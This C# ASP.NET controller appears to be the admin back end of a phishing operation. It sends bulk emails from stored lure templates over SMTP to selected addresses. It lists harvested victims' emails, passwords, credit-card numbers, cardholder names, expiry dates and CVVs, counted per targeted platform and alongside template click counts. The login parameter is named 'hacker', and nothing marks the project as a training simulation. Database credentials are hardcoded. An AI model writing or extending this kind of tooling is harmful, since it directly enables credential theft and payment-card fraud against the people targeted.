using System.Diagnostics;
using Microsoft.AspNetCore.Mvc;
using Npgsql;
using WebProject.Models;
using WebProject.Functions;

namespace WebProject.Controllers;

public class HomeController : Controller
{
    private readonly string connectionString = "Server=localhost;Port=5432;Username=erdemkurt;Password=353535;Database=phishing;";
    // private readonly string connectionString = "Server=localhost;Port=49152;Username=senayilmaz;Password=2002;Database=webprojectdb;";
    private readonly ILogger<HomeController> _logger;
    //erdme 

    public HomeController(ILogger<HomeController> logger)
    {
        _logger = logger;
    }
    
    public IActionResult Index()
    {
        
        return View();
    }
    
    
    [HttpPost]
    public IActionResult Index(AdminModel hacker)
    {
        bool isHacker = checkAdmin(hacker);
        if (isHacker)
        {
            return RedirectToAction("AdminDashboard", "Home");
        }
        else
        {
            ViewData["ErrorMessage"] = "Kullanıcı adı veya şifre yanlış"; 
        }
        return View();
    }
    
    public IActionResult AdminDashboard()
    {
        List<UserModel> phishingUserList = GetUserFromDatebase();
        Dictionary<int, int> platformCounts = GetPlatformCountsFromDatabase();
        ViewBag.PlatformCounts = platformCounts;
        return View(phishingUserList);
    }

    public IActionResult SendEmail()
    {
        SendEmailViewModel viewModel = new SendEmailViewModel();
        List<UserModel> userEmail = GetUserFromDatebase();
        List<EmailTemplateModel> emailTemplates = GetEmailTemplatesFromDatabase();
        viewModel.Users = userEmail;
        viewModel.EmailTemplates = emailTemplates;
        return View(viewModel);
}
    
    [HttpPost]
    public IActionResult SendEmail(SendMail data)
    {
        SendEmailViewModel viewModel = new SendEmailViewModel();
        List<UserModel> userEmail = GetUserFromDatebase();
        List<EmailTemplateModel> emailTemplates = GetEmailTemplatesFromDatabase();
        var template_id = data.template_id;
        var emails = data.emails;
        var selectedTemplate = emailTemplates[0]; // default
        foreach (var template in emailTemplates)
        {
            if (template.et_id == int.Parse(template_id))
            {
                selectedTemplate = template;
            }
        }
        foreach (var email in emails)
        {
            SMTP mail = new SMTP(email); 
            mail.SendMail(selectedTemplate.template_content, selectedTemplate.template_name);
        }
        
        viewModel.Users = userEmail;
        viewModel.EmailTemplates = emailTemplates;
        return View(viewModel);
    }
    
    
    
    
    public IActionResult EmailTemplates()
    {
        var emailTemplates = GetEmailTemplatesFromDatabase();
        return View(emailTemplates);
    }
    [ResponseCache(Duration = 0, Location = ResponseCacheLocation.None, NoStore = true)]
    
    public IActionResult Statistics()
    {
        List<UserModel> phishingUserList = GetUserFromDatebase();
        Dictionary<int, int> platformCounts = GetPlatformCountsFromDatabase();
        ViewBag.PlatformCounts = platformCounts;
        return View(phishingUserList);   
        
    }
    public IActionResult Error()
    {
        return View(new ErrorViewModel { RequestId = Activity.Current?.Id ?? HttpContext.TraceIdentifier });
    }
    public IActionResult DeleteTemplate(int id)
    {
        bool isExecuteCorrect = DeleteEmailTemplateFromDatabase(id);
        if (isExecuteCorrect)
        {
            ViewData["SuccessMessage"]= "Template is deleted";
        }
        else
        {
            ViewData["ErrorMessage"] = "Template is not deleted";
        }
        return RedirectToAction("EmailTemplates", "Home");
    }

    private bool DeleteEmailTemplateFromDatabase(int id)
    {
        string deleteQuery = "DELETE FROM email_templates WHERE et_id = @TemplateId";
        bool isExecuteCorrect = false;
        using (var connection = new NpgsqlConnection(connectionString))
        {
            connection.Open();
            using (var command = new NpgsqlCommand(deleteQuery, connection))
            {
                command.Parameters.AddWithValue("@TemplateId", id);
                isExecuteCorrect = command.ExecuteNonQuery() > 0;
            }
        }
        return isExecuteCorrect;
    }


    private List<UserModel> GetUserFromDatebase()
    {
        string selectQuery = "SELECT pu.user_id, pu.user_email, pu.user_password, pu.user_cc, pu.user_date,pu.user_name_on_card ,pu.user_cvv, pl.platform_name, pu.platform_id " +
                             "FROM \"phishing_users\" pu " +
                             "INNER JOIN \"platforms\" pl ON pu.platform_id = pl.platform_id";

        List<UserModel> PhishingUserList = new List<UserModel>();

        using (var connection = new NpgsqlConnection(connectionString))
        {
            connection.Open();
            using (var command = new NpgsqlCommand(selectQuery, connection))
            {
                using (var reader = command.ExecuteReader())
                {
                    while (reader.Read())
                    {
                        UserModel phishinguser = new UserModel
                        {
                            user_id = reader["user_id"] != DBNull.Value ? Convert.ToInt32(reader["user_id"]) : 0,
                            platform_id = reader["platform_id"] != DBNull.Value ? Convert.ToInt32(reader["platform_id"]) : 0,
                            user_email = reader["user_email"].ToString(),
                            user_password = reader["user_password"].ToString(),
                            user_name_on_card = reader["user_name_on_card"] != DBNull.Value ? reader["user_name_on_card"].ToString() : null,
                            user_cc = reader["user_cc"] != DBNull.Value ? reader["user_cc"].ToString() : null,
                            user_date = reader["user_date"] != DBNull.Value ? reader["user_date"].ToString() : null,
                            user_cvv = reader["user_cvv"] != DBNull.Value ? reader["user_cvv"].ToString() : null
                        };
                        PhishingUserList.Add(phishinguser);
                    }
                }
            }
        }
        return PhishingUserList;
    }
    
    public Dictionary<int, int> GetPlatformCountsFromDatabase()
    {
        Dictionary<int, int> platformCounts = new Dictionary<int, int>();
        string selectQuery = "SELECT platform_id, COUNT(*) AS user_count FROM phishing_users WHERE platform_id IS NOT NULL GROUP BY platform_id;";

        using (var connection = new NpgsqlConnection(connectionString))
        {
            connection.Open();
            using (var command = new NpgsqlCommand(selectQuery, connection))
            {
                using (var reader = command.ExecuteReader())
                {
                    while (reader.Read())
                    {
                        if (reader["platform_id"] != DBNull.Value)
                        {
                            int platformId = Convert.ToInt32(reader["platform_id"]);
                            int count = Convert.ToInt32(reader["user_count"]);
                            platformCounts.Add(platformId, count);
                        }
                    }
                }
            }
        }

        return platformCounts;
    }

    
    private List<EmailTemplateModel> GetEmailTemplatesFromDatabase()
    {
        string selectQuery = "SELECT * FROM email_templates";

        List<EmailTemplateModel> emailTemplates = new List<EmailTemplateModel>();

        using (var connection = new NpgsqlConnection(connectionString))
        {
            connection.Open();
            using (var command = new NpgsqlCommand(selectQuery, connection))
            {
                using (var reader = command.ExecuteReader())
                {
                    while (reader.Read())
                    {
                        EmailTemplateModel emailTemplate = new EmailTemplateModel
                        {
                            et_id = Convert.ToInt32(reader["et_id"]),
                            template_name = reader["template_name"].ToString(),
                            template_content = reader["template_content"].ToString(),
                            platform_id = Convert.ToInt32(reader["platform_id"]),
                            click_count = Convert.ToInt32(reader["click_count"])
                        };
                        emailTemplates.Add(emailTemplate);
                    }
                }
            }
        }
        return emailTemplates;
    }
    public bool checkAdmin(AdminModel admin)
    {
        string selectQuery = "SELECT * FROM admin WHERE admin_username = @AdminName AND admin_password = @AdminPassword";
        bool isExecuteCorrect = false;
        using (var connection = new NpgsqlConnection(connectionString))
        {
            connection.Open();
            using (var command = new NpgsqlCommand(selectQuery, connection))
            {
                command.Parameters.AddWithValue("@AdminName", admin.admin_username);
                command.Parameters.AddWithValue("@AdminPassword", admin.admin_password);
                using (var reader = command.ExecuteReader())
                {
                    if (reader.Read())
                    {
                        isExecuteCorrect = true;
                    }
                }
            }
        }
        return isExecuteCorrect;
    }
}